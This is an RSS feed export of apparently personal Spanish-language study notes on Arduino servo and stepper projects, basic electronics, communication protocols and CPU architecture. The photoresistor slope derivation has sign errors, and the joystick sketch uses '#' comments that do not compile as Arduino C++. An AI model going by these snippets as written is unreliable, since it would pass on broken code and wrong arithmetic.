(LightValue1, Angle1) = (780, 0)<br>
y<br>
(x2, y2) =  (LightValue2, Angle2) = (150, 160)<br>De esta manera podríamos empezar a calcular.<br>m = y2 - y1 / x2 - x1 <br>m = (160 - 0) / (150 - 780)<br>m =  160 / - 630<br>m = - 16 / - 63<br>Como paso final, para el correcto mapeo de los posibles valores haremos uso de una última fórmula utilizada tradicionalmente para la representación y análisis de líneas en ejes cartesianos.<br>La fórmula a utilizar es:<br>y - y1 = m(x - x1)<br>Realizando las conversiones sería:<br>angleValue - 0 = -16 / -63 * (lightValue - 780)<br>angleValue = - (16 / 63) * (lightValue + 16*780 / 63)<br>Lo que trasladado a código sería:<br>#include &lt;Servo.h&gt;

int servoPin = 9;
int readInput = A1;
int servoPosition = 0;

float angle;

Servo myServo;

void setup() {
  // put your setup code here, to run once:
  myServo.attach(servoPin); // Attach my servo to the pin
  pinMode(readInput, INPUT);
  Serial.begin(9600);
}

void loop() {
  // put your main code here, to run repeatedly:
  angle = (-16./63.) * analogRead(readInput) + 16.*780./63.;
  Serial.println(angle);
  myServo.write(angle); // Move the servo
  delay(10000);
  // };
}
Copy]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/arduino-proyects/4.-photoresistor-con-servomotor.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Arduino Proyects/4. Photoresistor con Servomotor.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 07 May 2024 13:29:49 GMT</pubDate></item><item><title><![CDATA[Componentes necesarios]]></title><description><![CDATA[ 
 <br><br>
<br>Arduino (Cualquier modelo compatible).
<br>x2 Servomotor.
<br>Análogico de joystick.
<br>Cables jumpers, macho macho y macho hembra (en este caso puede variar la cantidad de cables a utilizar dependiendo del cuidado al llevar a cabo en el circuito).
<br><br><br>El proyecto consiste en realizar la configuración de un joystick para posteriormente hacer uso de dos servomotres enlazados entre si para poder controlar un servomotor cunado el joystick se mueva en el eje X y otro servomotor para cuando el joystick se mueva en el eje Y, de esta manera lograriamos un completo rango de movimiento con un "brazo robot" (Dos servomotores enlazados) que en la puntan podrían tener un lazer a gusto.<br>#include &lt;Servo.h&gt;

# Used pines
int joystickXPin = A0;
int joystickYPin = A1;
int joystickSwPin = 2;
int servoXPin = 12;
int servoYPin = 13;

# Vars to analog values from joystick (X and Y) and vars to save the angles for servos
float joystickXVal, joystickYVal, servoXAngle, servoYAngle;
int joystickSwVal;

# Declare the two servos
Servo ServoX;
Servo ServoY;

# Print the joystick movements
void printJoystickValues(){
  Serial.print("X: ");
  Serial.print(joystickXVal);
  Serial.print(" Y: ");
  Serial.print(joystickYVal);
  Serial.print(" SW: ");
  Serial.println(joystickSwVal);
  delay(200);
}

void setup() {
  // put your setup code here, to run once:
  Serial.begin(9600);
  pinMode(joystickXPin, INPUT);
  pinMode(joystickYPin, INPUT);
  pinMode(joystickSwPin, INPUT);
  # Set de joystick swtich to 1 to get 0 wen is pressed.
  digitalWrite(joystickSwPin, HIGH);
  # Attach the servo pines to servos
  ServoX.attach(servoXPin);
  ServoY.attach(servoYPin);
}

void loop() {
  // put your main code here, to run repeatedly:
  joystickXVal = analogRead(joystickXPin);
  joystickYVal = analogRead(joystickYPin);
  joystickSwVal = analogRead(joystickSwPin);

  printJoystickValues();

  # Make a logic to get de 180° possible from 1023 analog values from joystick (X and Y)
  servoXAngle = (180./1023.) * joystickXVal;
  servoYAngle = (180./1023.) * joystickYVal;

  # Move the servos to calculated angle
  ServoX.write(servoXAngle);
  ServoY.write(servoYAngle);
}

Copy<br><br><br><img alt="servos_with_joystick.jpg" src="https://dobliuw.com/lib/media/servos_with_joystick.jpg" style="width: 1200px; max-width: 100%;">]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/arduino-proyects/5.-micro-robot-laser.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Arduino Proyects/5. Micro robot laser.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 09 May 2024 02:35:07 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/servos_with_joystick.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/servos_with_joystick.jpg&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Componentes necesarios]]></title><description><![CDATA[ 
 <br><br>
<br>Arduino (Cualquier modelo compatible).
<br>Motor paso a paso.
<br>Módulo controlador de motor paso a paso.
<br>Potenciometro.
<br>Boton pulsador
<br>Fuente de alimentación para protoboard.
<br>Adaptador 9v a pin conector.
<br>Pila de 9v.
<br>Cables jumpers, macho macho y macho hembra (en este caso puede variar la cantidad de cables a utilizar dependiendo del cuidado al llevar a cabo en el circuito).
<br><br><br>El proyecto consiste simplemente en poder controlar un motor paso a paso el cual estará constantemente girando, pero tras presionar un boton el motor cambiara su dirección y a su vez, tendremos un potenciomentro el cual aumentara las revoluciones por vuelta del motor, haciendo que este aumente o disminuyá su velocidad.<br>#include &lt;Stepper.h&gt;
int setpsPerRevolution = 2038;

Stepper myStepper = Stepper(setpsPerRevolution, 8, 10, 9, 11);

int potenciometorPin = A0;
int buttonPin = 2;
int oldButton = 1;
int revolution, newButton;
float potenciometorValue;
String loopWay = "rigth";

void setup() {
  // put your setup code here, to run once:
  Serial.begin(9600);
  pinMode(buttonPin, INPUT);
  pinMode(potenciometorPin, INPUT);
  digitalWrite(buttonPin, HIGH);
}

void loop() {
  // put your main code here, to run repeatedly:
  if(loopWay == "rigth"){
    myStepper.step(10);
  }else{
    myStepper.step(-10);
  }
  
  potenciometorValue = analogRead(potenciometorPin);
  revolution = 14./1023. * potenciometorValue + 1;
  newButton = digitalRead(buttonPin);
  Serial.print("Button: ");
  Serial.println(newButton);
  Serial.print("Loop way:");
  Serial.println(loopWay);
  Serial.print("Revolution: ");
  Serial.println(revolution);
  
  // Detect when the button is pressed and change de way
  if(oldButton == 1 &amp;&amp; newButton == 0){
    loopWay = loopWay == "rigth" ? "left" : "rigth";
  }

  oldButton = newButton;
  myStepper.setSpeed(revolution);
  

}
Copy<br><br><br><img alt="stepper_motor_with_button_and_potenciometor_electronic.jpg" src="https://dobliuw.com/lib/media/stepper_motor_with_button_and_potenciometor_electronic.jpg">]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/arduino-proyects/6.-stepper-motor-change-the-way-and-vol.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Arduino Proyects/6. Stepper motor change the way and vol.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 15 May 2024 23:07:34 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/stepper_motor_with_button_and_potenciometor_electronic.jpg" length="0" type="image/jpeg"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/stepper_motor_with_button_and_potenciometor_electronic.jpg&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Eléctronica]]></title><description><![CDATA[ 
 <br><br>La eléctronica es una rama de la física aplicada que comprende la física, la ingeniería, la tecnología y las aplicaciones que tratan con la emisión, el flujo y el control de los eletrones u otras partículas cargadas eléctricamente.<br><br><br><br>
<br>Son valores discretos que pueden tomar únicamente dos estados: 0 o 1.
<br>Utilizados para representar información de manera binaria.
<br>Se manipulan utilizando pines digitales, como 0 a 13 en Arduino.
<br>Tienen estados de HIGH (1) o LOW (0) dependiendo del voltaje aplicado.
<br><br>
<br>Representan cantidades que pueden variar de forma continua en un rango determinado.
<br>Ejemplos incluyen voltraje eléctrico, temperatura, luz, sonido, etc.
<br>Se pueden medir utilizando pines de entrada analógica, como A0 a A5 en Arduino Uno.
<br>Se convierten en números digitales dentro de un rango predefinido utilizando la función analogRead().
<br><br><br>La ley de Ohm es uno de los conceptos fundamentales en la electrónica, formulada por el físico alemán Georg Simon Ohm en el siglo XIX. Esta ley establece la relación entre la corriente eléctrica (I), la diferencia de potencial o voltaje (V), y la resistencia eléctrica (R) en un circuito eléctrico.<br>La expresión matemática para calcular el voltaje es:<br><br>La expresión matemática para calcular la corriente eléctrica es:<br><br>Y la expresión matemática para calcular la resistencia eléctrica es:<br><br>Donde V es el voltaje en voltios (v).<br>
Donde I es la corriente eléctrica que fluye a través del circuito en amperios (a).<br>
Donde R es la resistencia eléctrica del circuito en ohmios (Ω). ]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/elelctronic/electronic.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/Elelctronic/Electronic.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 23 May 2024 11:22:47 GMT</pubDate></item><item><title><![CDATA[Arduino Uno R3]]></title><description><![CDATA[ 
 <br><br><a data-tooltip-position="top" aria-label="https://docs.arduino.cc/hardware/uno-rev3/#suggested-libraries" rel="noopener nofollow" class="external-link" href="https://docs.arduino.cc/hardware/uno-rev3/#suggested-libraries" target="_blank">Arduino Uno R3</a> es una placa de microcontrolador basada en el chip ATMega328P, esta cuenta con entradas y salidas digitales (GPIO) que pueden ser programadas para interactuar con componentes electrónicos. También cuenta con entradas analógicas para medir voltajes variables.<br>Un microcontrolador es un circuito integrado programable, capaz de ejecutar las órdenes grabadas en su memoria.<br><img alt="arduino_uno_r3.png" src="https://dobliuw.com/lib/media/arduino_uno_r3.png" style="width: 300px; max-width: 100%;"><br>
Arduino Uno R3 <br><br>Las salidas digitales, también conocidas como pines GPIP (General Purpose Input/Output) en Arduino, son los pines que pueden ser programados para enviar señales digitales, es decir, señales que pueden estar en uno de los dos estados: alto (HIGH) o bajo (LOW). <br>
<br>Cada pin GPIO en Arduino puede ser configurado como una salidad digital mediante le código de programación.
<br>Cuando un pin se configura como salida digital, puede enviar una señal de voltaje que puede ser interpretada como HIGH o LOW.
<br>En el estado HIGH, el pin entraga un voltaje de aproximadamente 5 voltios (En Arduino Uno), mientras que en el estado LOW, el pin entrega un voltaje cercano a cero voltios (tierra).
<br>Para cargar código en el microcontrolador de Arduino Uno se utiliza el entorno de desarrollo integrado <a data-tooltip-position="top" aria-label="https://www.arduino.cc/en/software" rel="noopener nofollow" class="external-link" href="https://www.arduino.cc/en/software" target="_blank">(<em></em>) de Arduino</a>IDE. Este IDE permite escribir, editar, compilar y cargar el código en la placa Arduino de manera sencilla. En cuanto al lenguaje de programación utilizado por este, es una combinación de <a data-href="Notes/5. Technologies/Lenguajes y Tools/C/C" href="https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/c/c.html" class="internal-link" target="_self" rel="noopener nofollow">Notes/5. Technologies/Lenguajes y Tools/C/C</a> y C++, esto ya que el IDE proporciona algunas funciones y bibliotecas específicas que simplifican la programación y la interacción con los pines de la placa. <br>También haciendo uso del protocolo Firmata, protocolo que permite la comunicación entre software de ordenador y microcontroladores como Arduino, podemos controlar el Arduino haciendo uso de un script en Python u otro lenguaje de programación. Existen bibliotecas como PyFirmata, que facilitan la cominicación con Arduino a través de este protocolo. MicroPython es una implementación del lenguaje de programación Python ptimizado para microcontroladores y algunos modelos de Arduino pueden ejecutar código escrito en este lenguaje. También, en caso de estar haciendo uso de una <a data-href="Raspberry PI" href="https://dobliuw.com/notes/6.-hardware/raspberry-pi/raspberry-pi.html" class="internal-link" target="_self" rel="noopener nofollow">Raspberry PI</a> en conjunto a una placa Arduino, podemos escribir código Python en la Raspberry PI para controlar el Arduino a través de la comunicación serie, I2C, SPI u otros protocolos de comunicación.<br><br><br><br>Una protoboard o breadboard es una tabla rectangular de plastico con un montón de orificios pequeños en ella que permiten conectar de manera facil componentes electrónicos para realizar de manera temporal conexiones sin necesidad de soldura.<br><img alt="bread_board.png" src="https://dobliuw.com/lib/media/bread_board.png" style="width: 300px; max-width: 100%;"><br>
BreadBoard<br><br>Los cables jumper son cables flexibles con conectores macho en ambos extremos que se utilizan par conectar los pines de los componentes electrónicos en la protoboard y en la plata Arduino.<br><img alt="jumper_cables.png" src="https://dobliuw.com/lib/media/jumper_cables.png" style="width: 300px; max-width: 100%;"><br>
Jumper Cable<br><br>Los LEDs son dispositivos semiconductores que emiten luz cuando se les aplica una corriente eléctrica en la dirección correcta, estos tienen un ánodo (Terminal positivo) y un Cátodo (Terminal negativo).<br><img alt="LEDs.png" src="https://dobliuw.com/lib/media/leds.png" style="width: 300px; max-width: 100%;"><br>
LEDs<br><br>Las resistencias se utilizan para limitar la corriente que fluye a través de los LEDs y otros componentes, estos se especifican por su valor de resistencia en ohmios (Ω).<br><img alt="resistencias.png" src="https://dobliuw.com/lib/media/resistencias.png" style="width: 300px; max-width: 100%;"><br>
Resistencias<br><br>Los botones o interruptores son dispositivos que nos permiten abrir o cerrar un circuito eléctrico manualmente, estos pueden ser momentáneos (Normalmente abiertos) o alternadores (Normalmente cerrados).<br><img alt="buttons_electronic.png" src="https://dobliuw.com/lib/media/buttons_electronic.png" style="width: 300px; max-width: 100%;"><br>
Botones<br><br>Los sensores, existiendo una amplia variedad de ellos, son utilizados con Arduino para medir diferentes variables, como temperatura, luz, humedad, movimiento, entre otros. La mayoría de ellos se comunican con Arduino a través de GPIOs como I2C, SPI o UART.<br><img alt="resistencias_electronic.png" src="https://dobliuw.com/lib/media/resistencias_electronic.png" style="width: 300px; max-width: 100%;"><br>
Sensores variados<br><br>Los motores convierten la energía eléctrica en movimiento mecánico, mientras que los servomotores son motores que pueden controlarse con precisión para moverse a ángulos específicos.<br><img alt="0. Images/servomotor_electronic.png" src="https://dobliuw.com/lib/media/servomotor_electronic.png" style="width: 300px; max-width: 100%;"><br>
Servomotor<br><img alt="setp_motor_electronic.png" src="https://dobliuw.com/lib/media/setp_motor_electronic.png" style="width: 300px; max-width: 100%;"><br>
Motor (Stepper | paso a paso)<br><br>Los Display LCD (Liquid Crystal Display) permiten mostrar información, como texto o gráficos, generadas por arduinos, estos se comunican con Arduino a través de interfaces como paralelo, I2C o SPI.<br><img alt="display_lcd_electronic.png" src="https://dobliuw.com/lib/media/display_lcd_electronic.png" style="width: 300px; max-width: 100%;"><br>
Display LCD<br><br>Los Buzzers son dispositivos que generan sonido cuando se les aplica una corriente eléctrica, estos pueden utilizarse para crear señales audibles.<br><img alt="buzzer_electronic.png" src="https://dobliuw.com/lib/media/buzzer_electronic.png" style="width: 300px; max-width: 100%;"><br>
Buzzer o Zumbador<br><br>Los fusibles y las protecciones de sobretensión son dispositivos de seguridad que se utiliza para proteger los componentes electrónicos contra daños causados por corrientes excesivas o picos de voltaje en el circuito.<br><img alt="fusibles_electronics.png" src="https://dobliuw.com/lib/media/fusibles_electronics.png"><br>
Fusibles]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/0.-arduino-y-componentes-electrónicos.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/0. Arduino y Componentes electrónicos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 21 Aug 2024 22:28:33 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/arduino_uno_r3.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/arduino_uno_r3.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Interfaces]]></title><description><![CDATA[ 
 <br><br>En electrónica, una interfaz es el punto de conexión entre dos sistemas o dispositivos que les permite comunicarse o intercambiar datos entre sí. Las interfaces son importantes porque facilitar la interacción entre diferentes componentes electrónicos y sistemas, permitiendo que trabajen juntos de manera eficiente y coordinada. <br>Sin interfaces, sería difícil o imposible conectar dispositivos electrónicos entre sí y hacer que funcionen como un sistema integrado.<br><br>Las comunicaciones se refieren al intercambio de información o datos entre dos o más dispositivos a través de una interfaz. Las comunicaciones son importantes porque permiten que los dispositivos electrónicos transmitan datos, comandos y señales entre sí, lo que les permite coordinar acciones y realizar funciones específicas.<br>Las comunicaciones son fundamentales para la automatización, el control remoto, la monitorización y la interacción entre sistemas electrónicos.<br><br>Los protocolos son conjuntos de reglas y normas que gobiernan la comunicación entre dispositivos. Los protocolos son impoprtantes porque garantizan que los dispositivos puedan comunicarse de manera efectiva y confiable, asegurando que los datos se transmitan correctamente y que los dispositivos puedan entenderse entre sí.<br>Los protocolos estandarizados permiten la interoperabilidad entre diferentes dispositivos y sistemas, lo que facilita la integración y la compatibilidad entre equipos de diferentes fabricantes.<br><br><br><br>Las interfaces físicas con los conectores y puertos físicos que se utilizan para conectar dispositivos electrónicos entre sí, estas permiten la transferencia de energía, datos, audio, vídeo u otras señales entre dispositivos.<br>Algunas de las interfaces físicas más comunes son:<br>
<br>USB (Universal Serial Bus): Utilizado para conectar dispositivos como teclados, mouses, unidades de almacenamiento, impresoras, entre otros, a ordenadores y otros dispositivos.<br>
<img alt="usb_interface_image.png" src="https://dobliuw.com/lib/media/usb_interface_image.png" style="width: 300px; max-width: 100%;">  <img alt="usb_conector_image.png" src="https://dobliuw.com/lib/media/usb_conector_image.png" style="width: 300px; max-width: 100%;">
<br>HDMI (High-Definition Multimedia Interface): Utilizado para transmitir señales de vídeo y audio de alta definición entre dispositivos, como televisores, monitores, reproductores de DVD/Blu-ray, consolas de videojuegos, etc.
<br>VGA (Video Graphics Array): Un estándar de conexión analógica utilizado anteriormente para conectar monitores, proyectores y otros dispositivos de visualización a ordenadores y otros dispositivos.
<br>RJ45 (Registered Jack 45): Utilizado para conexiones de red Ethernet, como en cables de red y conectores de red en routers, switches, ordenadores, e tc.<br>
<img alt="intefaces_hardware_image.png" src="https://dobliuw.com/lib/media/intefaces_hardware_image.png">
<br><br>Las interfaces virtuales son formas de comunicación entre dispositivos que se realiza a través de software, en lugar de a través de conexiones físicas directas como cables o conectores. Estas interfaces se llaman "virtuales" porque no implican una conexión física real entre los dispositivos, sino que se basan en la transmisión de datos a través de señales eléctricas, ópticas o inalámbricas.<br>Algunas de las interfaces virtuales más comunes son:<br>
<br>UART (Universal Asynchronous Receiver-Transmitter): Utilizado para la comunicación serie asíncrona entre dispositivos, como en la comunicación entre microcontroladores, módulos GPS, módems, etc.
<br>SPI (Serial Peripheral Interface): Utilizado para la comunicación serie síncrona entre un microcontrolador y dispositivos periféricos, como sensores, memorias flash, displays, etc.
<br>I2C (Inter-Integrated Circuit): Utilizado para la comunicación serie síncrona de los hilos entre dispositivos, como en la comunicación entre microcontroladores, sensores, memorias EEPROM, etc.
<br>CAN (Controller Area Network): Utilizado en aplicaciones de redes de control y automatización, como en la industria automotiz, para la comuniacación entre dispositivos en tiempo real.
<br><br><br><br>En la comunicación serie, los datos se transmiten secuencialmente, un bit a la vez, a través de un solo canal de comunicación, este tipo de comunicación es una forma sencilla y eficiente de transmitir datos, especialmente en distancias cortas. Los ejemplos comunes de comunicación serie incluyen UART y RS-232.<br><br>En la comunicacion paralela, múltiples bits de datos se transmiten simultáneamente a través de múltiples líneas de comunicación, esta esa más rápida que la comunicación serie, ya que transfiere arios bits al mismo tiempo. Se utiliza en aplicaciones donde se requiere una alta velocidad de transferencia de datos, como los buses de datos internos de las computadoras.<br><br>En la comunicación inalámbrica, los datos se transmiten a través de ondas electromagnéticas en lugar de conexiones físicas como cables, esto es útil en situaciones donde las conexiones por cable son difíciles o impracticables, como en dispositivos móviles, redes Wi-Fi, Bluetooth, entre otros. Ejemplos comunes de comunicación inalámbrica incluyen Wi-Fi, Bluetooth, NFC, RFID, entre otros.<br><br>La comunicación half fuplex permite la transmisión de datos en ambas direcciones, pero no simultáneamente. Es decir, los dispositivos pueden enviar o recibir datos ,pero no ambas cosas al mismo tiempo. Por otro lado, en la comunicación full duplex se permite la transmision de datos en ambas direcciones, es decir, los dispositivos pueden enviar y recibir datos al mismo tiempo, lo que resulta en una comunicación más eficiente.<br><br><br>Es importante mencionar que aunque algunas interfaces virtuales puedan estar asociadas con protocolos específicos (Por ejemplo, el protocolo de comunicación UART), no todas las interfaces virtuales son protocolos en sí mismas. Una interfaz virtual puede implementar uno o varios prtocolos para facilitar la comunicación entre dispositivos.<br>
<br>Las interfaces virtuales son puntos de comunicación entre dispositivos electrónicos que se basan en software el lugar de conexiones físicas directas.
<br>Los protoclos, por otro lado, son conjuntos de reglas y normas que gobiernan la comunicación entre dispositivos, es decir, definen cómo se transmiten y definen datos, cómo se inicia y finaliza la comunicación, cómo se detecta y corrigen los errores, etc.
<br>Los protocolos son lo mismo que a nivel software, como podrían ser TCP y UDP (Protocoolos de comunicación en redes que definen cómo se transmiten los datos entre dispositivos a través de una red). Otros ejemplos de protocolos a nivel de aplicación podrían incluir SSH, HTRTP, HTTPS, TCP/IP y otros. Solo que a nivel de hardware, los protocolos pueden controlar aspectos como la transmisión de señales eléctricas o inalámbricas entre dispositivos, la sincronización de datos, la dtección y correción de errores en la transmisión, entre otros.<br>IMPORTANTE: Es de crucial importancia tener en cuenta ciertos terminos como:<br>
<br>Componente: Un componente dentro de un sistema electrónico es una pieza individual que forma parte de un sistema electrónico más grande. Estos pueden ser elementos pasivos como resistencias, capacitadores, inductores o elementos activos como transistores, diodos, circuitos integrados, etc.
<br>Dispositivo: Un dispositivo dentro de un sistema electrónico es una entidad completa y funcional que realiza una función específica en un sistema electrónico. Un dispositivo puede contener múltiples componentes interconectados y encapsulados. Ejemplos: microcontroladores, procesadores, sensores, módulos de comunicación, pantallas LCD, etc.
<br>Bus: Conjunto de líneas de comunicación que se utilizan para transmitir datos, direcciones, señales de control u otro tipo de información entre diferentes componentes dentro de un sistema electrónico.
<br>Buses: Son conjuntos de líneas de datos y control que se utilizan para interconectar múltiples dispositivos en un sistema electrónico. 
<br>Maestro: Dispositivo que inicia y controla la comunicación en el bus de comunicación,. puede controlar cuándo comienza y termina una transacción de comunicación, así como la velocidad de la comunicación.
<br>Esclavo: Dispositivo que responde a las solicitudes del maestro en el bus de comunicación, estos dispositivos no puede iniciar la comunicación por sí mismos, solo pueden responder a las solicitudes del maestro..
<br>Líneas de datos: Son cables físicos a través de los cuales se trasnmiten lso datos entre dispositivos en una comuinicación.
<br><br>
<br>Funcionamiento: La comunicación UART es un tipo de comunicación serie asíncrona en la que los datos se transmiten secuencialmente, es decir, un bit a la vez, a través de dos líneas de datos: TX (Transmisión) y RX (Recepción).
<br>Uso: Se utiliza para la comunicación serie entre dispositivos, como microcontroladores, módems, GPS, entre otros. Es ampliamente utilizado debido a su simplicidad y facilida de implementación.
<br><br>
<br>Funcionamiento: La comunicación SPI es un tipo de comunicación serie síncrona en la que los datos se transmiten de forma sincronizada con una señal de reloj (SCK) a través de cuatro líneas: MOSI (Master Out Slave IN), MISO (Master In Slave Out). SCK (Clock) y SS (Slave Select).
<br>Uso: Se utiliza para la comunicación entre un microcontrolador (maestro) y varios dispositivos periféricos (esclavos), como sensores, memorias flash, displays, entre otros.
<br><br>
<br>Funcionamiento: La comunicación I2C es un tipo de comunicación serie síncrona de dos hilos que utiliza dos líneas de datos: SDA (datos) y SCL (reloj). Permite la comunicación entre múlitples dispositivos (maestros y esclavos) en el mismo bus.
<br>Uso: Se utiliza para la comunicación entre microcontroladores y dispositivos periféricos, como sensores, memorias EEPROM, RTC (Real-Time Clock), entre otros. Es ideal para aplicaciones con múltiples dispositivos en un mismo bus de comunicación.
<br><br>
<br>Funcionamiento: El protocolo CAN es un protocolo de comunicación serie bidireccional utilizado en redes de control y automatización. Permite la comunicación entre varios nodos (dispositivos) en tiempo real.
<br>Uso: Se utiliza en aplicaciones de automoción, como en el sector automotriz, para la comuinicación entre unidades de control, sensores, actuadores, entre otros dispositivos.
<br><br>
<br>Funcionamiento: El protocolo USB es un estándar de comunicación serie que permite la conexión de dispositvios electrónicos a través de cables USB. Proporciona alimentación y transferencia de datos entre dispositivos.
<br>Uso: Se utiliza para contectar una amplia variedad de dispositivos a ordenadores y otros dispositivos, como traclados, ratones, unidades de almacenamiento, impresoras, entre otros.
]]></description><link>https://dobliuw.com/notes/6.-hardware/arduino/1.-interfaces,-comunications-y-protocols.html</link><guid isPermaLink="false">Notes/6. Hardware/Arduino/1. Interfaces, Comunications y Protocols.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 25 Apr 2024 00:18:50 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/usb_interface_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/usb_interface_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[CPU (Central Processing Unit)]]></title><description><![CDATA[ 
 <br><br>La CPU o Unidad Central de Procesamiento es el componente principal de un sistema infromático que realiza la mayoría de las operaciones de procesamiento de datos. Actúa como el "cerebro" del dispositivo, ejecutando instruccioens de programas y controlando otros componentes del sistema.<br><br><br><br>El reloj de la CPU es un oscilador electrónico que genera pulsos a intevalos regulares. cada pulso representa un ciclo de reloj y sincroniza todas las operaciones dentro de la CPU.<br>El reloj se encarga de coordinar la ejecución de instrucciones y el flujo de datos en la CPU. Cada operación en la CPU se realiza en sincronía con estos pulsos de reloj, asegurando que las diferentes partes de la CPu trabajen juntas de manera ordenada.<br><br>La frecuencia del reloj es la velocidad a la que el reloj de la CPU genera puslso, medida en Hertz (Hz). En el contexto de las CPus, se suele expresar en megahercios (Mhz) o gigaherzios (Ghz).<br>Una mayor frecuencia de reloj significa que la CPU puede realizar más ciclos por segundo, lo que generalmente se traduce a una mayor capacidad de procesamiento. Sin embargo, el rendimiento real también depende de otros factores como la arquitectura y la eficiencia del pipeline.<br><br>Los núcleos son una unidad de procesamiento independiente dentro de la CPU que puede ejecutar sus propias instruacciones. Las CPUs modernas suelen tener múltiples núcleos, lo que permite el procesamiento paralelo de múltiples tareas.<br>Types<br>
<br>Singe-Core: CPU con un solo núcleo.
<br>Multy-Core: CPu con dos o más núcleos (Dual-core, Quad-core, Hexa-core, etc.), permitiendo la ejecución simultánea de múltiples hilos de procesamiento.
<br><br>El cache es una memoria rápida y de pequeño tamaño integrada en la CPU. Su función es almacenar temporalmente datos e instrucciones que la CPU usa con frecuencia, reduciendo así el tiempo de acceso comparado con la memoria principal (RAM).<br>Cache Levels<br>
<br>L1 Cache: El más rápido y pequeño, directamente accesible por cada núcleo.
<br>L2 Cache: Más grande que el L1, puede ser dedicado a cada núcleo o compartido.
<br>L3 Cache: El más grande y lento, compartido entre todos los núcleos.
<br><br>El ISA o Conjunto de Instrucciones de Arquitectura, es el conjutno de comandos que la CPU puede ejecutar. Define las operaciones disponibles, el formato de las instrucciones y los modos de direccionamiento.<br>ISA Types<br>
<br>CISC (Complex Instruction Set Computing): Conjunto de instrucciones complejas
<br>RISC (Reduced Instruction Set Computing): Conjunto de instrucciones reducido y optimizado para la rapidez.
<br><br>El pipeline es una técnica de procsamiento que divide la ejecución de instrucciones en varias etapas consecutivas. Esto permite que varias instrucciones se procesen simultáneamente en diferentes etapas del pipeline.<br>Pipeline Stages<br>
<br>Fetch: Obtención de la instrucción desde la memoria.
<br>Decode: Decodificación de la instrucción.
<br>Execute: Ejecución de la instrucción.
<br>Memory Access: Acceso a la memoria si es necesario.
<br>Wrtieback: Escritura del resultado en un registro o en la memoria.
<br><br><br>Las arquitecturas de sistemas operativos (<a data-href="Operative Systems Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/operative-systems-basics.html" class="internal-link" target="_self" rel="noopener nofollow">Operative Systems Basics</a>) también abarcan la forma en que el software se comunica con el hardware, y aquí es donde entrar las arquitecturas de CPU, como x86, x86_64 (o x64), ARM, entre otras. Estas arquitecturas determinan la capacidad del procesador y cómo maneja las instrucciones y los datos.<br><br>La arquitectura x86 es una de las más antiguas y comunes, desarrollada por Intel. Es una arquitectura de 32 bits que ha sido la base de muchos procesadores de escritorio y portátiles.<br>
<br>Bits: 32
<br>Memory Direction: Los procesadores x86 pueden direccionar hasta 4 GB de memoria RAM, esto se debe a que con 32 bits, se pueden crear 2^32 direcciones de memoria, lo que equivale a 4,294,967,296 (4GB).
<br>Compatibility: Altamente compatible con software antiguo y sistemas operativos diseñados para 32 bits.
<br>Instructions: Conjutno de instrucciones CISC (Complex INstruction Set Computing).
<br><br>La arquitectura x86_64 o x64, es una extensión de la x86 y es capaz de manejar 64 bits. Fue introducida por AMD como AMD64 y posteriormente adoptada por Intel como Intel 64.<br>
<br>Bits: 64
<br>Memory Direction: Los procesadores de x86_64 pueden direccionar teóricamente hasta 16 exabytes (2^64 direcciones). Sin embargo, las implementeaciones actuales limitan esto a niveles más prácticos debido a restricciones físicas y de sistema operativo. Por ejemplo, muchos sistemas opertivos actuales limitan el soporte a varias terabytes de RAM, mucho más que los 4 GB de x86.
<br>Compatibility: Los procesadores x86_64 pueden ejecutar tanto software de 32 bits como de 64 bits. Esto es posible gracias a la compatibilidad hacia atrás (Backward compatibility) que permite que los preocsadores manejen instrucciones de 32 bits en un modo esepecail de compatibilidad.
<br>Instructions: Amplía el conjunto de instrucciones CISC de x86 con nuevas instrucciones y registros para mejorar el rendimineto y las capacidades del procesador.
<br><br>La arquitectura ARM (Advanced RISC Machine) es una arquitectura de 32 bits y 64 bits utilizada principalmente en dispositivos móviles y embebidos debido a su eficiencia energética.<br>
<br>Bits: 32 bits (ARMv7) y 64 bits (ARMv8).
<br>Memory Direction: ARMv7 puede direccionar hasta 4GB de RAM, mientras que ARMv8 puede direccionar mucho más.
<br>Compatibility: Utilizada en una amplia gama de dispositvios desde teléfonos inteligentes hasta servidores.
<br>Instructions: Conjunto de instrucciones RISC (Reduced Instruction Set Computing), que es más sencillo y eficiente energéticamente.
